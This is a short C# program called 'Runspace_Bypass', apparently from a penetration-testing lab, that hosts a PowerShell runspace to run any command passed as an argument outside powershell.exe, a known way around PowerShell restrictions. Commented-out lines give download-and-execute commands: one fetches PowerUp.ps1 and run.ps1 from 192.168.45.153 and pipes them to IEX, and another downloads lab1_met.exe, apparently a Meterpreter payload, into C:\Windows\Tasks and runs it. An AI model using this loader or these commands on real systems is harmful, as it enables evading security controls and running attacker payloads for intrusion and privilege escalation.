using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Runspace_Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            String cmd = args[0];
            //String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.153/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Tools\\power.txt";
            //String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.153/run.ps1') | IEX";
            //String cmd = "wget http://192.168.45.153/lab1_met.exe -O C:\\Windows\\Tasks\\lab1_met.exe; C:\\Windows\\Tasks\\lab1_met.exe";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}


